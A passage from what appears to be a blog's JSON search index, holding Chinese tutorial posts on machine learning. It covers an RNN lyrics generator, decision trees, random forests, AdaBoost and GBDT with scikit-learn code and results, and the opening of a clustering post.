torch.save(model.state_dict(),\u0026#39;./Model/6_Lyrics_Generator/Model.pth\u0026#39;) 1 2 3 # 模型加载 model = LyricsGenerator(10) model.load_state_dict(torch.load(\u0026#39;./Model/6_Lyrics_Generator/Model.pth\u0026#39;, weights_only=True)) \u0026lt;All keys matched successfully\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 模型评估 def generate_lyrics(model,word_index,index_word,start_words,sentence_length,device=\u0026#39;cpu\u0026#39;): model.to(device) hidden = model.init_hidden(bs=1).to(device) model.to(device) word_idx = word_index[start_words] generate_sentence = [word_idx] for _ in range(sentence_length): output,hidden = model(torch.tensor([[word_idx]]).to(device),hidden) word_idx = torch.argmax(output).cpu().item() generate_sentence.append(word_idx) for idx in generate_sentence: print(index_word[idx],end=\u0026#39;\u0026#39;) 1 2 3 start = \u0026#39;知道\u0026#39; word_len = 100 generate_lyrics(model,word_index,index_word,start,word_len) 知道这里很美但家乡的你更美原来我只想要你 陪我去吃汉堡 说穿了其实我的愿望就怎么小 就怎么每天祈祷我的心跳你知道 杵在伊斯坦堡 却只想你和汉堡 我想要你的微笑每天都能看到 我知道这里很美但家乡的你更美原来我只想要你 陪我去吃汉堡 说穿了其实我的愿望就怎么小 就怎么每天 ","date":"2025-12-02T20:51:17+08:00","image":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/60aa0004-c259-49eb-b742-6515691c6d92_hu_de4706188334dd7a.png","permalink":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/","title":"机器学习-神经网络"},{"content":" 目录 决策树（Decision-Making Tree） 集成学习（Ensemble Learning） 分类 Bagging Boosting 随机森林（Random Forest） 袋外数据（OOB，Out of bag data） AdaBoost（Adaptive Boosting，自适应增强） GBDT（梯度提升决策树） 集成学习（Ensemble Learning） 决策树（Decision-Making Tree） 决策树是有监督机器学习的一种 模型生成：通过大量数据生成一棵非常好的树（寻找最优的分裂条件） 预测：按照生成好的树的标准落到某一个叶子节点上 算法思想 $$ \\begin{aligned} \u0026 function \\ \\operatorname{DecisionTree}(data:\\mathcal{D}=\\{(x_n,y_n)\\}_{n=1}^N) \\\\ \u0026\\qquad \\operatorname{if} \\ termination\\ citeria met: \\qquad\\text{//如果满足终止条件}\\\\ \u0026\\qquad\\qquad \\begin{aligned} \\operatorname{return}\\ base\\ hypothesis\\ g_t(x) \\qquad\\text{//返回第t个叶子节点的值} \\end{aligned}\\\\ \u0026\\qquad\\operatorname{else}\\\\ \u0026\\qquad\\qquad \\begin{aligned} \u0026 \\operatorname{learn}\\ branching\\ criteria\\ b(x) \\qquad\\text{//学习最优分裂条件b(x)，该条件产生C个结果分支}\\\\ \u0026 split\\ \\mathcal{D}\\ to\\ C\\ parts\\ \\mathcal{D}_C=\\{(x_n,y_n):b(x_n)=c\\} \\qquad//把当前的数据集\\mathcal{D}切分成C个部分 \\\\ \u0026 \\operatorname{build}\\ sub-tree\\ G_C\\ \\leftarrow \\ \\operatorname{DecisionTree}(\\mathcal{D}_C) \\qquad\\text{//递归在子结点上再进行子树划分}\\\\ \u0026 \\operatorname{return}\\ G(x)=\\displaystyle{\\sum^C_{c=1}[[b(x)==c]]G_C(x)} \\qquad\\text{//返回整体数结构表达式} \\end{aligned} \\end{aligned} $$ 生成决策树所需分裂指标——离散问题（$D_c为特征A的第c个取值样本子集$） Gini系数： 公式： $$\\displaystyle{Gini^{init}(p)=\\sum_{k=1}^Kp_k(1-p_k)=1-\\sum_{k=1}^Kp_k^2}$$ 基尼系数越小，代表D集合中的数据约纯，所以可以计算分裂前的值在按照某个维度对数据集进行划分，然后计算多个节点的Gini系数：$$\\displaystyle{Gini^{Divided}(D,A)=\\sum_{c \\in Values(A)}\\frac{|D_c|}{|D|}Gini(D_c) }$$ 收益函数：$$Gain(D,A)=Gini^{init}(D)-Gini^{Devided}(D,A)$$ 信息增熵：$H(X) \\simeq Gini(X)$ 公式： $$\\displaystyle{H(N) = -\\sum_j P(\\omega_j)\\log_2P(\\omega_j) }$$ 划分后的多个结点的熵之和：$$\\displaystyle{H^{Devided}(D,A)=-\\sum_{c \\in Values(A)}\\frac{|D_c|}{|D|}H(D_c) }$$ 收益函数：$$\\displaystyle{Gain(D,A)=H^{init}(D)-H^{Devided}(D,A)}$$ 信息增益率 特征A的固有值（Intrinsic Value）：$$\\operatorname{IV}(A)=\\displaystyle{-\\sum_{c \\in Values(A)}\\frac{|D_c|}{|D|}log_2\\frac{|D_c|}{|D|}}$$ 信息增益率：$$\\displaystyle{GainRatio(D,A)=\\frac{Gain(D,A)}{IV(A)}}$$ MSE（回归问题） 剪枝：解决过拟合问题 前剪枝：在构建决策树的过程中，限定最小叶子内的节点数、最大深度等条件 后剪枝: REP——错误率降低剪枝 PEP——悲观剪枝 CCP——代价复杂度剪枝 CCP为子树 $ T_t $ 定义了代价（cost）和复杂度（complexity），以及一个可由用户设置的衡量代价与复杂度之间关系的参数 $ \\alpha^* $ ，其中代价指的是在剪枝过程中因子树 $ T_t $ 被叶子节点替代而增加的错分样本，复杂度表示剪枝后子树 $ T_t $ 减少的叶子节点数量。 $ \\alpha $ 表示剪枝后树的复杂度减低程度与代价之间的关系。当 $ \\alpha^* \u0026lt; \\alpha $ 时就可以将该节点下的子树剪掉，当前节点作为叶子节点 $$ \\begin{aligned} \u0026\\alpha = \\displaystyle{\\frac{R(t)-R(T_t)}{|N_1|-1}}\\\\ 其中，\u0026|N_1|:子树T_t中的叶子节点数 \\\\ \u0026 R(t)为结点t的错误代价，R(t)=r(t)*p(t) \\\\ \u0026 r(t)为结点t的错分样本率，p(t)为落入结点t的样本占所有样本的比例 \\\\ \u0026 R(T_t)为子树T_t的错误代价，R(T_t)=\\displaystyle{\\sum_iR(i)},i为子树T_t的叶子节点 \\end{aligned} $$ 各特征重要性评估指标：$$FI(j)=\\displaystyle{\\frac{\\displaystyle{\\sum_{t\\ use\\ j}N_t·Gain(t)}}{\\displaystyle{\\sum_{all\\ t}N_t·Gain(t)}}}$$，其中 $ N_t $ 是分裂节点 $ t $ 的样本数 在线绘制工具：Graphviz Online 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 # 决策树实现鸢尾花分类 import pandas as pd import numpy as np from sklearn.datasets import load_iris from sklearn.tree import DecisionTreeClassifier from sklearn.tree import export_graphviz from sklearn.model_selection import train_test_split from sklearn.metrics import accuracy_score import matplotlib.pyplot as plt import matplotlib as mpl from itertools import product from sklearn.preprocessing import StandardScaler from sklearn.preprocessing import MinMaxScaler from sklearn.pipeline import Pipeline def show(X,y,names,species): s = [t for t in sorted(list(set([tuple(sorted(p)) for p in product([0,1,2,3],repeat=2)]))) if t[0]!=t[1]] fig,axs = plt.subplots(2,3,figsize=(12,7)) axs = axs.flatten() for index,((x1,x2),ax) in enumerate(zip(s,axs)): [ax.scatter(X[y==lab][:,x1],X[y==lab][:,x2],label=f\u0026#34;[{lab}]{species[lab]}\u0026#34;) for lab in set(y)] ax.set_xlabel(f\u0026#34;{names[x1]}:Data[{x1}]\u0026#34;) ax.set_ylabel(f\u0026#34;{names[x2]}:Data[{x2}]\u0026#34;) ax.legend() plt.tight_layout() plt.show() iris = load_iris() data = pd.DataFrame(iris.data) data.columns = iris.feature_names data[\u0026#39;species\u0026#39;] = iris.target X,y = (iris.data,iris.target) show(X,y,data.columns,iris.target_names) X_train,X_test,y_train,y_test = train_test_split(X,y,train_size=0.8,random_state=42) pip = Pipeline(steps = [ (\u0026#39;dtc\u0026#39;,DecisionTreeClassifier(max_depth=8,criterion=\u0026#39;gini\u0026#39;,random_state=428)), ]) pip.fit(X_train,y_train) print(f\u0026#34;Accuracy of the test set (four features): {pip.score(X_test,y_test)}\u0026#34;) export_graphviz( pip[\u0026#39;dtc\u0026#39;], out_file=\u0026#34;Output/Iris_Decision_Tree/tree_dot.dot\u0026#34;, filled=True, rounded=True, node_ids=True, class_names=None ) print(f\u0026#34;feature importances: {pip[\u0026#39;dtc\u0026#39;].feature_importances_}\u0026#34;) #特征0与特征1的重要性极低 pip.fit(X_train[:,2:4],y_train) print(f\u0026#34;Accuracy of the test set (two features): {pip.score(X_test[:,2:4],y_test)}\u0026#34;) export_graphviz( pip[\u0026#39;dtc\u0026#39;], out_file=\u0026#34;Output/Iris_Decision_Tree/tree1_dot.dot\u0026#34;, filled=True, rounded=True, node_ids=True ) #深度探测：寻找最优树深 scores = {} for depth in np.arange(1,15): dtc = DecisionTreeClassifier(max_depth=depth,criterion=\u0026#39;gini\u0026#39;,random_state=428) dtc.fit(X_train[:,2:4],y_train) scores[str(depth)]=dtc.score(X_test[:,2:4],y_test) print(scores) ​ ​\nAccuracy of the test set (four features): 1.0 feature importances: [0.03334028 0. 0.88947325 0.07718647] Accuracy of the test set (two features): 1.0 {'1': 0.6333333333333333, '2': 0.9666666666666667, '3': 1.0, '4': 1.0, '5': 1.0, '6': 1.0, '7': 1.0, '8': 1.0, '9': 1.0, '10': 1.0, '11': 1.0, '12': 1.0, '13': 1.0, '14': 1.0} 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # 决策树拟合回归模型 from sklearn.tree import DecisionTreeRegressor import numpy as np import matplotlib.pyplot as plt from sklearn.model_selection import train_test_split from sklearn.tree import export_graphviz colors = [ \u0026#39;#e41a1c\u0026#39;, \u0026#39;#377eb8\u0026#39;, \u0026#39;#4daf4a\u0026#39;, \u0026#39;#984ea3\u0026#39;, # 红 蓝 绿 紫 \u0026#39;#ff7f00\u0026#39;, \u0026#39;#ffff33\u0026#39;, # 橙 黄 \u0026#39;#1b9e77\u0026#39;, \u0026#39;#d95f02\u0026#39;, \u0026#39;#7570b3\u0026#39;, \u0026#39;#e7298a\u0026#39;, # 青 棕 靛 洋红 \u0026#39;#66a61e\u0026#39;, \u0026#39;#666666\u0026#39; # 草绿 深灰 ] np.random.shuffle(colors) def mapping(x): np.random.seed(20030428) return np.sin(x**2/2) + np.random.randn(len(x),1)*0.1 # 特征数 n = 1 # 数据量 m = 10000 # 随机生成 x 序列 X = np.random.rand(m,n) * 10 - 4 # 模拟非线性回归分布 y = mapping(X) plt.scatter(X,y,s=0.05) X_train,X_test,y_train,y_test = train_test_split(X,y,train_size=0.7,random_state=428) # plt.scatter(X_train,y_train) index = X_test[:,0].argsort(axis=0) X_test = X_test[index] y_test = y_test[index] print(len(X_test),len(y_test)) scores = {} for depth,color in zip(np.arange(3,15),colors): dtr = DecisionTreeRegressor(max_depth=depth,random_state=428) dtr.fit(X_train,y_train) scores[str(depth)] = dtr.score(X_test,y_test) export_graphviz(dtr,out_file=\u0026#34;Output/Practice01_Reg_Decision_Tree/depth_\u0026#34;+str(depth)+\u0026#34;.dot\u0026#34;) if depth in [3,6,9]: plt.plot(X_test,dtr.predict(X_test),c=color,ms=0.05,label=\u0026#34;depth=\u0026#34;+str(depth)) plt.legend() print(scores) depth = int(list(scores.keys())[np.argmax(list(scores.values()))]) print(depth,scores[str(depth)]) 3000 3000 {'3': 0.6082955315717642, '4': 0.7350159653921886, '5': 0.8994966783739446, '6': 0.9402911147144416, '7': 0.9630064233693199, '8': 0.969353657452782, '9': 0.9713638580425933, '10': 0.9699000308717682, '11': 0.9676749619741486, '12': 0.9648717916673495, '13': 0.963189780460903, '14': 0.9609148583309566} 9 0.9713638580425933 集成学习（Ensemble Learning） Advance-Organizer：假设有10个决策树 单决策树算法：找到10个决策树中最可靠的决策树树进行预测 随机森林算法：所有决策树进行投票，少数服从多数 Adaboost：更可靠的决策树分到更多的票数 集成学习的单个弱学习器可以基于不同的学习策略构建 分类 Bagging 训练：有放回地对原始训练集进行均匀抽样（Bootstrap抽样），将抽样结果用于并行独立训练 $g(x)$ 模型：同权重投票，对于分类任务少数服从多数；对于回归任务取平均 例如：random forest Boosting 训练：通过训练集训练 $g_i$ ，再通过 $ g_k(k\\in{1,2\\dots i}) $ 的预测结果调整训练集，训练得到 $ g_{i+1} $ 模型：按照某个权重序列进行投票，对于回归任务求加权平均 例如：Adaboost，GBDT，Xgboost 随机森林（Random Forest） Bagging思想 + 决策树基学习器 + 同权投票 模型训练： 采样：有放回的从原始数据中随机抽取部分样本或特征 训练：使用每次采样获得的子训练集分别并行训练决策树 模型：随机森林投票（同权投票，少数服从多数） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 from sklearn.ensemble import RandomForestClassifier,BaggingClassifier,VotingClassifier # 集成学习器 from sklearn.linear_model import LogisticRegression # 逻辑回归 from sklearn.svm import SVC # 支持向量机 from sklearn.tree import DecisionTreeClassifier # 决策树 基学习器 from sklearn.model_selection import train_test_split from sklearn.datasets import load_iris data = load_iris() X,y = iris.data,iris.target X_train,X_test,y_train,y_test = train_test_split(X,y,train_size=0.8,random_state=428) rfc = RandomForestClassifier( # 随机森林 criterion=\u0026#39;gini\u0026#39;, n_estimators=15, # 多少棵树 # max_depth=8, # 单棵树最大深度 max_leaf_nodes=16, # 最大叶子节点数 n_jobs=-1, # 启用所有CPU资源 max_samples = None, # 单次抽取的样本数量。默认最大数量的有放回随机取样 max_features=\u0026#39;sqrt\u0026#39;, bootstrap = True, random_state=428, oob_score=True, # OOB算法，具体见下文 # verbose=True ) rfc.fit(X_train,y_train) print(f\u0026#34;RandomForest Accuracy: {rfc.score(X_test,y_test)}\u0026#34;) print(f\u0026#34;RandomForest OOB Score: {rfc.oob_score_}\u0026#34;) # OOB_SCORE为无偏估计 bgc = BaggingClassifier( estimator=LogisticRegression(), # 用逻辑回归作为基学习器，默认为决策树 n_estimators=15, # 基学习器个数 # max_samples=None, # 单次抽样的样本个数 max_features=0.8, # 随机选择特征 n_jobs=-1, bootstrap = True, random_state=428, oob_score=True, # OOB算法，具体见下文 # verbose=True ) bgc.fit(X_train,y_train) print(f\u0026#34;Bagging Accuracy: {bgc.score(X_test,y_test)}\u0026#34;) print(f\u0026#34;Bagging OOB Score: {bgc.oob_score_}\u0026#34;) # OOB_SCORE为无偏估计 vtc = VotingClassifier( estimators=[ (\u0026#39;lr\u0026#39;,LogisticRegression()), (\u0026#39;svm\u0026#39;,SVC()), (\u0026#39;DT\u0026#39;,DecisionTreeClassifier()) ], n_jobs=-1, # 全部核 # verbose=True ) vtc.fit(X_train,y_train) print(f\u0026#34;Voting Accuracy: {bgc.score(X_test,y_test)}\u0026#34;) RandomForest Accuracy: 0.9666666666666667 RandomForest OOB Score: 0.95 Bagging Accuracy: 0.9666666666666667 Bagging OOB Score: 0.975 Voting Accuracy: 0.9666666666666667 袋外数据（OOB，Out of bag data） 一条数据N轮都没有被抽到的概率为 $\\displaystyle{\\underset{N\\rightarrow\\infty}{limit}\\ (1-\\frac{1}{N})^N = \\frac{1}{e} \\approx 36.79%}$ 整个训练过程中有大约 36.79% 的数据未被使用（这部分数据称为OOB），OOB为天然验证集 思想：无需像交叉验证一样显式地将数据集划分为训练集和验证集，就可以在训练过程中天然、无偏地评估模型地泛化能力，解决了验证集需要额外数据或减少训练数据量的问题。OOB判断仅基于样本是否被包含在Bootstrap训练集中，而与特征使用无关 具体算法过程 第一步：训练阶段（假设原始训练集 $ D $ ，大小为 $ N $ 。构建一个包含 $ T $ 课决策树的随机森林） 对每棵树 $ t_i(i = 1,2\\dots T) $ 进行 $ Bootstrap $ 抽样 从 $ D $ 中有放回地随机抽取 $ N $ 个样本，形成该树的 $ Bootstrap $ 训练集 $ D_i $ 同时，没有被抽中的样本构成袋外样本集 $ OOB_i $ 。每个样本作为袋外样本的概率为36.79% 用 $ D_i $ 训练第 $ i $ 课决策树 $ t_i $ 训练时，随机森林还会从所有特征中随机选择一部分特征进行节点的分裂，以增加树的多样性。 记录每个样本的OOB预测器 对于一个特定的样本 $ (x,y) $ ，找出所有没有使用它进行训练的树。即找到所有 $ OOB_i,(x,y)\\in OOB_i $ 。这些树组成了样本 $ (x,y) $ 的OOB预测器 第二步：评估OOB误差（泛化误差估计） 对每个样本 $ (x,y) $ 进行OOB预测 取出该样本的OOB预测器集合 让这个预测器集合中的每棵决策树对x进行预测 通过投票（对于分类问题）或平均（对于回归问题）的方式，汇总这些树的预测结果，得到样本 $ (x,y) $ 的最终OOB预测值 $ \\hat y_{OOB} $ 计算所有样本的OOB误差 分类问题（分类错误率）： $$OOB\\_Error = \\displaystyle{\\frac{1}{N}\\sum^N_{i=1}I(y_i\\neq \\hat y_{OOB_i})} $$ ，其中 $ I(j) $ 为指示函数，若 $ j $ 为 $ True $ 则输出 $ 1 $ ； $ j $ 为 $ False $ 则输出 $ 0 $ 回归问题（均方误差）： $$ OOB\\_Error = \\displaystyle{\\frac{1}{N}\\sum^N_{i=1}(y_i-\\hat y_{OOB_i})^2} $$ 该误差作为模型泛化能力的无偏估计，用于评估模型性能；指导模型超参数的选择，无需额外验证集；确定最优的树数量；进行模型诊断；指导特征选择；作为早期停止准则 第三步：其他应用 特征重要性评估：如果一个特征很重要，那么随机打乱其值会显著降低模型性能 对于每棵树 $ t_i $ ，计算袋外样本 $ OOB_i $ 的误差，记作 $ Err_{OOB_i} $ 随机打乱（排序） $ OOB_i $ 中的某个特征j的值 用打乱后的 $ OOB_i $ 再次计算 $ t_i $ 的预测误差，记作 $ Err_{perm_i} $ 对于特征 $ j $ ，它在所有树上的重要性得分可以计算为： $$ \\displaystyle{Importance_j = \\frac{1}{T}\\sum_{i=1}^T(Err_{perm_i}-Err_{OOB_i}) }$$ ，该值衡量了由于特征j被打乱导致的模型性能下降程度。下降得越多，该特征越重要 将所有特征得重要性得分进行归一化，以便比较 AdaBoost（Adaptive Boosting，自适应增强） 思想： 弱分类器：AdaBoost通过将多个比较简单的、性能较弱的基学习器（“弱分类器”）组合起来，构建出强大的、性能优异的“强分类器”。通常一个弱分类器为深度为 1 的二分决策树（决策树桩）。 “自适应”：在每一轮训练中，它都会根据前一轮的分类结果、自动调整训练数据的权重分布，使得算法在后续轮次中更加关注那些被前一个弱分类器分错的样本（提高分错样本在损失函数中的权重）。这样，每个新生成的弱分类器都是在“弥补”前一个分类器的不足。 重点关注错误：在训练过程中更加关注那些被前一个分类器分错的样本。通过不断调整样本的权重实现 专家投票：每个弱分类器的水平有高有低。最终决策时性能好的弱分类器原有更大的投票权重 算法流程： 初始化：为每个样本分配相同的初始权重：$$\\displaystyle{w_i^{(0)}=\\frac{1}{m},i \\in \\{1,2,\\dots m\\}}$$ 训练T个弱分类器： $$G_t(x),t \\in \\{1,2,\\dots T\\}$$ 使用当前的样本权重分布 $w_t$ 训练一个二分类弱分类器 $G_t(x)$ 计算当前弱分类器的加权错误率 $$\\displaystyle{\\epsilon_t=\\sum_{i=1}^mw_i^{(t)}·I(G_t(x_i) \\neq y_i)} \\le 0.5$$，$$ 其中, I(j) = \\begin{cases} 1,\u0026 j=True \\\\ 0,\u0026 j=False \\\\ \\end{cases} $$ 计算当前弱分类器的权重： $\\alpha_t = \\displaystyle{\\frac{1}{2}ln(\\frac{1-\\epsilon_t}{\\epsilon_t})}$， $$ \\begin{cases} \u0026\\alpha \\rightarrow +\\infty , \u0026\\epsilon=0 \\\\ \u0026\\alpha = 0 , \u0026\\epsilon=0.5 \\\\ \u0026\\alpha \u003e 0 , \u0026\\epsilon \u003c 0.5, \\ 且\\epsilon_t越小，\\alpha_t越大 \\end{cases} $$ 更新样本权重： $$ \\begin{array} ww_i^{t+1}=w_i^{(t)}\\exp(-\\alpha_t·y_i·D_t(x_i))·Z_t \\\\ y_iG_t(x_i)=\\begin{cases} +1,x_i分类正确 \\\\ -1,x_i分类错误 \\\\ \\end{cases} \\\\ Z_t为规范化因子，为常数，目的是让所有权重加起来等于1 \\end{array} $$ 组合所有分类器 经过T轮迭代，得到T个弱分类器及其权重 $$\\{G_t,\\alpha_t\\}, t \\in \\{1,2\\dots T\\}$$ 最终的强分类器F(x)是所有弱分类器的加权投票结果：$$F(x)=sign({\\displaystyle{\\sum_{t=1}^T\\alpha_tG_t(x)}})$$ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from sklearn.ensemble import AdaBoostClassifier from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.metrics import accuracy_score import matplotlib.pyplot as plt import numpy as np iris = load_iris() X,y = iris.data[:,2:4],iris.target X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) abc = AdaBoostClassifier( n_estimators=50, learning_rate=1, random_state=42 ) abc.fit(X_train,y_train) print(abc.score(X_test,y_test)) 1.0 GBDT（梯度提升决策树） Boosting思想 + 决策树 + 梯度下降思想 思想： Gradient：通过梯度下降来最小化损失函数。每一棵树的新建都是为了学习之前所有树组合的预测结果的残差 Boosting：串行集成方法。基学习器一个个依次训练，每一都试图修正前一个的错误。 Decision Tree：使用CART回归树作为弱学习器，不论是分类任务还是回归任务 算法流程： 第一步：模型初始化 用一个常数来初始化一个非常简单的模型，通常取损失函数最小的常数值。对于平方误差损失，这个值就是目标值的均值。 $$F^{(0)}(x) = \\underset{\\gamma}{argmin}\\displaystyle{\\sum_{i=1}^nL(y_i,\\gamma)=\\frac{1}{n}\\sum_{i=1}^ny_i}$$ 第二步：循环迭代 计算伪残差：对于每条样本1-n，计算当前模型的负梯度: $$\\gamma_i^{(m)}=-\\displaystyle{[\\frac{\\partial L(y_i,F(x_i))}{\\partial F(x_i)}]|_{F(x)=F^{(m-1)}(x)}}$$ 对于平方误差损失：$$L=\\displaystyle{\\frac{1}{2}(y_i-F(x_i))^2}$$。有：$$\\gamma_i^{(m)}=y_i-F^{(m-1)}(x_i)$$ 使用训练数据$$(x_i,\\gamma_i^{(m)})_{i=1}^{n}$$ 训练一颗新的CART回归树 $h^{(m)}(x)$。这棵树的叶节点区域记为 $R_j^{(m)}$，其中 $j=1,2\\dots J^{(m)} ,\\ J^{(m)}$是第 $m$ 棵树的叶子节点数 为树的每个叶子节点计算最佳输出值：对于第m棵树的每一个叶子节点区域$R_j^{(m)}$。计算一个最佳输出值 $\\gamma_j^{(m)}$ 。这个值是这个叶子节点区域内，能使损失函数最小化的值：$$\\displaystyle{\\gamma_j^{(m)}=\\underset{\\gamma}{argmin}\\sum_{x_i \\in R_j^{(m)}}L(y_i,F^{(m-1)}(x_i)+\\gamma)}$$。对于平方误差损失，这个值就是落入这个叶节点的所有样本的伪残差的均值。 更新模型。将新树加入到当前模型中，进行更新： $$\\displaystyle{F^{(m)}(x) = F^{(m-1)}(x) + \\nu · \\sum_{j=1}^{J^{(m)}}\\gamma_{j}^{(m)}I(x \\in R_{j}^{(m)})}$$，其中$\\nu$为学习率 得到最终模型：$$\\displaystyle{F^{(M)}(x) = F^{(0)}(x) + \\nu · \\sum_{m=1}^{M}h^{(m)}(x)}$$ GBDT+LR架构 思想： GBDT负责：自动进行特征组合和转换。 它将原始的特征向量自动转化为一个新的、更高维的、且具有强表征能力的稀疏特征向量。 LR负责：在新生成的特征向量上进行高效训练。 LR模型简单、可解释性强，并且非常适合处理大规模稀疏特征。 架构详解 训练GBDT模型：训练一个含有m个基学习器（决策树），每个基学习器有n个叶子节点（n分类）。输入r维样本x。x分别喂给m个基学习器，最终x一定会落到每个基学习器的某个叶子节点上。创建一个m*n维向量X，依次对应每个学习器的叶子节点。若x落到某个叶子节点，则对应X的位置标为1，未落入的位置标为0。至此，r维的x向量转为mn维的X向量。 将稀疏样本X喂给LR模型进行训练 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 from sklearn.ensemble import AdaBoostClassifier from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.metrics import accuracy_score from sklearn.pipeline import Pipeline from sklearn.preprocessing import StandardScaler import matplotlib.pyplot as plt import numpy as np from sklearn.ensemble import GradientBoostingClassifier iris = load_iris() X,y = iris.data[:,:],iris.target X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) pip = Pipeline([ (\u0026#39;scl\u0026#39;,StandardScaler()), (\u0026#39;gbc\u0026#39;,GradientBoostingClassifier( n_estimators=100, learning_rate=0.1, max_depth=3, random_state=42 )) ]) pip.fit(X_train,y_train) pip.score(X_test,y_test),pip[\u0026#39;gbc\u0026#39;].feature_importances_ (1.0, array([0.00135739, 0.01465991, 0.66567719, 0.31830551])) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 # GBDT + LR from sklearn.datasets import load_iris from sklearn.model_selection import train_test_split from sklearn.ensemble import GradientBoostingClassifier from sklearn.linear_model import LogisticRegression from sklearn.preprocessing import OneHotEncoder class GradientBoostingClassifierWithLogisticRegression(object): def __init__(self,X_train,X_test): self.gbdt_model = None self.lr_model = None self.gbdt_encoder = None self.X_train_leafs = None self.X_test_leafs = None self.X_encoded = None self.train_model(X_train,X_test) def train_gbdt_model(self,X_train,y_train): self.gbdt_model=GradientBoostingClassifier( n_estimators=5, max_depth=2, max_features=0.5 ).fit(X_train,y_train) def train_lr_model(self,X_train,y_train): self.lr_model=LogisticRegression().fit(X_train,y_train) def train_model(self,X_train,y_train): self.train_gbdt_model(X_train,y_train) self.X_train_leafs = self.gbdt_model.apply(X_train)[:,:,0] # 第0个类别分别落到了哪棵树上 self.gbdt_encoder = OneHotEncoder(sparse_output=False) self.X_encoded = self.gbdt_encoder.fit_transform(self.X_train_leafs) self.train_lr_model(self.X_encoded,y_train) def predict(self,X_test,y_test): X_test_leafs = self.gbdt_model.apply(X_test)[:,:,0] X_test_leafs_enconded = self.gbdt_encoder.transform(X_test_leafs) return self.lr_model.predict(X_test_leafs_enconded),self.lr_model.score(X_test_leafs_enconded,y_test) if __name__==\u0026#34;__main__\u0026#34;: iris = load_iris() X,y = iris.data[:,:],iris.target==2 X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42) fdbtlr=GradientBoostingClassifierWithLogisticRegression(X_train,y_train) print(fdbtlr.predict(X_train,y_train)) print(fdbtlr.predict(X_test,y_test)) (array([False, False, False, False, False, True, False, False, False, False, True, False, False, False, False, False, True, True, False, True, False, True, False, False, True, False, False, False, False, False, True, False, False, False, False, False, False, True, False, False, True, False, True, True, False, False, True, False, False, False, True, False, False, False, True, False, True, False, False, True, False, True, True, True, True, False, False, False, True, True, False, False, False, False, True, False, True, True, False, False, False, True, False, True, False, True, False, True, False, False, False, False, False, False, False, False, True, True, False, False, True, True, False, True, False, False, True, True, False, True, False, False, True, True, False, False, True, False, False, True]), 0.975) (array([False, False, True, False, False, False, False, True, False, False, True, False, False, False, False, False, True, False, False, True, False, True, False, True, True, True, True, True, False, False]), 1.0) ","date":"2025-12-02T20:30:43+08:00","image":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/output_3_1_hu_266086bdc7c4d681.png","permalink":"http://localhost:1313/p/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-%E9%9B%86%E6%88%90%E5%AD%A6%E4%B9%A0/","title":"机器学习-集成学习"},{"content":" 目录 K均值聚类（K-Means Clustering） 层次聚类（Hierarchical Clustering） 密度聚类 高斯混合模型（GMM模型） 单个高斯分布（GM） 混合高斯模型（GMM） EM算法 GMM流程 降维 降维方法： PCA降维 无监督学习（Unsupervised Learning） 聚类是一种无监督的机器学习任务，它可以自动将数据划分成类（Cluster） K均值聚类（K-Means Clustering） 对于没有标签的数据样本 $X$ ，根据 $X$ 的相似度划分为 $k$ 类 K-Means一般过程： 初始化：指定中心数（簇数） $k$ 以及 $k$ 个簇中心（ $ \\mu_1,\\mu_2\\dots \\mu_k $ ，经典K-Means中随机选择中心） 迭代： 分配步：对每个样本 $$ x_i,i \\in \\{ 1,2\\dots m \\},$$ 计算 $ x_i $与 $ \\mu_1,\\mu_2\\dots \\mu_k $ 的距离，并将 $ x_i $ 分配给簇中心距离其最近的簇：$$\\displaystyle{x_i \\rightarrow Cluster_{ \\underset{j}{argmin}||x_i-\\mu_j||^2}}$$ 更新步：更新簇中心：$$\\displaystyle{\\mu_j=\\frac{1}{|N_j|}\\sum_{x_i\\in Cluster_j}x_i}$$ 迭代至： 簇中心不变或变化幅度小于阈值 样本点的归属不再发生变化 迭代次数达到最大 K-Means损失函数MSE：每个点到中心点的距离 $$\\displaystyle{J(\\mu_1,\\mu_2 \\dots \\mu_k) = \\frac{1}{2} \\sum^k_{j=1}\\sum^{N_j}_{i=1}(x_i-\\mu_j)^2}$$ $k$ 的选取——肘部法 依次选取 $k\\in{1,2\\dots m}$，计算整体的损失 最终选取 $k_m$ 使得收益： $$Gain=|Loss(k_m-1)-Loss(k_m)|-|Loss(k_m)-Loss(k_m+1)|$$ 取得最大值。即$$\\displaystyle{k_m = \\underset{k}{\\operatorname{argmax}} |Loss(k-1)-Loss(k)|-|Loss(k)-Loss(k+1)|}$$ 相似度——以距离函数衡量 闵可夫斯基距离：$$\\displaystyle{d_p(x,y)=\\sqrt[p]{\\sum_{i=1}^n|x_n-y_n|^p}}$$ 